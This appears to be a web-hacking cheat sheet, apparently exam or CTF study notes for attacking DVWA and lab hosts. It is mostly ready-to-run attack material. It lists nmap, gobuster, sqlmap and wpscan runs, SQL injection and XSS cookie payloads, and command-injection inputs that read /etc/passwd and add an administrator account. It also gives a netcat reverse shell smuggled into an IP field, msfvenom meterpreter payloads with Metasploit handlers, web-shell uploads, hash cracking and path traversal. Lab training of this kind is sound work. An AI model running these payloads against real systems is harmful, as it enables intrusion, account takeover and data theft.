#### Reverse shell path
```bash
/usr/share/webshells/php/php-reverse-shell.php
just change ip and port in this code
```

#### WhatWeb
```bash
whatweb <url>
whatweb http://www.abc.com
```
####  flag.txt, example.com at IP
```bash
# Step 1 : Reconnaisance
nmap -sC -sV -p- <ip>
Focus on port 80/443 HTTP/HTTPS → since itʼs a web app.

# Step 2: Enumerate web app
Dirb or gobuster
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt

Run Nikto for quick vulnerability scanning:
nikto -h http://192.168.0.64

 If itʼs WordPress → use `wpscan`
wpscan --url http://192.168.0.64 --enumerate u,vt,tt

# Step 3:  Check for Vulnerabilities
SQL Injection (test login forms, URLs with `id=`)
File upload vulnerabilities (try uploading reverse shell payload)
Default credentials (admin\:admin, etc.)
 If `training.cehorg.com` has a login panel → try SQL injection (' OR 1=1--)

# Step 4 : Gain Acces
 If SQLi works → dump tables with `sqlmap`:
sqlmap -u "http://192.168.0.64/page.php?id=1" --dbs

If file upload is possible → upload a PHP reverse shell.
Example (PentestMonkey PHP reverse shell)
Upload `shell.php`
Start listener:
nc -lvnp 4444
Trigger `http://192.168.0.64/uploads/shell.php

# Step 5: Privilege Escalation
find / -name Flag.txt 2>/dev/null
read the file

```
#### If website given and asks for flag.txt
```bash
dirb http://training.cehorg.com -X .txt
http://training.cehorg.com/Flag.txt

or
scan the target with Zapp to find the vulnerability. Then exploit it
If it is file upload or file inclusion
msfconsole -> msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 -f raw >exploit.php
>use exploit/multi/handler or use 30
>set payload php/meterpreter/reverse_tcp
Set LHOST ipadd
Upload a file you created as exploit.php
Open terminal and type run once you get url type url in brower you get meterpreter session then type ls 
get the files. 
```
#### Given website and folder C:\Wamp64\www\DVWA\ECweb\Certified\” 
```bash
login to the dvwa application > set security level low > choose command execution type below commands
| dir "C:\Wamp64\www\DVWA\ECweb\Certified"
| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag1.txt"
| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag2.txt"
or
1. Open the url given and login with given details. 
2. After login http://172.20.0.16/DWVA/hackable/uploads/ 
3. They you see files open it and copy the hash value go to the hashes.com/en/decrypt/hash. Or try below. 
4. hash-identifier paste the text and see the type of hash and then hashcat -h | grep MD5 
5. hashcat -m 0 hash.txt /Desktop/word list/urser.txt 
```
#### Firewall
```bash
wafw00f
wafw00f abc.com

We can use this also "http-waf-detect.nse "
```
#### Owasp-Zap (Zapproxy)
```bash
-> Enter ->  zaproxy
-> No, I do not want to persist this session at this moment in time option and click on Start
-> Choose the Automated scan, enter the URL
-> Then Start Attack
Here Spider will crawl to directories, but sometimes it may miss some endpoints
The final results will be in Alerts
```
#### DVWA XSS reflect
```bash
<script>alert("Hacker")</script>
# To get cookie value
<script>alert(document.cookie)</script>

keep severity to Medium (Script will not work)
use below command
<img/src/onerror=prompt(1)>

```
#### XSS stored
```bash
same as above
```
#### DVWA Command Injection
```bash
ip && id
: whoami
| uname -a
: cat /etc/passwd
```
#### DVWA
```bash
`| type "path"` (to display content of file - windows)
`| cat "path"` (to display content of file - Linux)
```

#### parameter tampering (Page_id =100)
```bash
# Quick Notes
-----------
wordpress
sql
parameter tampering
nmap -sV --script=http-enum <target>
-----------
Check Wordpress module for more details

/index.php?page_id=103 ->  Paramter tampering.

try
sqlmap -u "http://www.cehorg.com/page.php?page_id=84" --dbs

or
-> nmap -sV --script=http-enum <target>
-> Find any input parameter on website and capture the request in burp and then use it to perform sql 
injection using sqlmap. 
-? Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” 
you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 
-> sqlmap -r <txt file from burpsuite> --dbs  
```

#### IDOR
```bash
We just need to add page=123 => we will get flag
```
#### Command Injection
```bash
# Reverse Shell
Open New terminal => sudo su
nc -nlvp 9696

Go back to cmd exec., 
8.8.8.8 | nc -e /bin/bash 192.168.1.9 9696

come back to NC terminal
pwd
ls
uname -a
python -c 'import pty; pty.spawn("/bin/bash")'
ls
exit

| hostname
| whoami
| tasklist
| net user
| net user hacker hacker /add then | net localgroup Administrators hacker /add

Command Execution:
If Linux
| ls "<Path>"
#once files are listed
| cat "<Path>"

If Windows
| dir "<Path>"
#once files are listed
| type "<Path>"

```

#### File Upload
```bash
1**Commands**
DVWA cred's =>
username - admin
passwd - password

In parrot browser > http://192.168.1.7/dvwa 
[Note :- make sure to set DVWA script security to LOW]

New terminal
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 --platform php -o Desktop/upload.php

New terminal
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.9
set LPORT 9999
exploit -j

upload the "upload.php" file in dvwa upload vuln., once file is uploaded copy the full path and in URL remove # & paste the path & hit enter
#If the process is unclear, check the below PoC
come back to msfconsole & hit enter once
sessions
sessions -i 1
	> sysinfo

[Note :- 192.168.1.7 is Meta 2 ip] [Note :- 192.168.1.9 is parrot ip]
```
#### Burpsuire
```bash
In the Browser to send the data through the Burp-suite(when intercept is on)  we have to Set the Connection Settings of the browser to Manual Proxy Configuration and HTTP Proxy = 127.0.0.1  Port = 8080 and the other(HTTP proxy and Socks Host) make them empty and click ok.

make sure intercept is on, to intercept traffice
```


#### Automated Tool - Smart Scanner
```bash
 cd wapiti
 python3 -m venv wapiti3 #to create a virtual env.
 . wapiti3/bin/activate #activate virtual env.
 pip install . #to intstall wapiti web application scanner
 wapiti -u https://[targetSite]
 
 #Note: It would take 10min to complete the scan. And the final report 
 /root/.wapiti/generated_report/
 
```

#### Dirb
```bash
dirb http://<Meta2IP>

Specific search
dirb <URL> -X .txt

```

#### Cewl
```bash
cewl -d 5 -w cewlfile.txt http:/IP/

Tips:
always update the database before scanning wordpress
use --random-user-agent to avoid being blocked
```
#### File Traversal (Directory Traversal)
```bash
Attacker tries to access restricted folders or files on the server

you can try:
dirb -u <Target>
https://example.com/view?file=images/cat.jpg

If the server is not validating the file path properly, an attacker could do:
https://example.com/view?file=../../../../etc/passwd
```

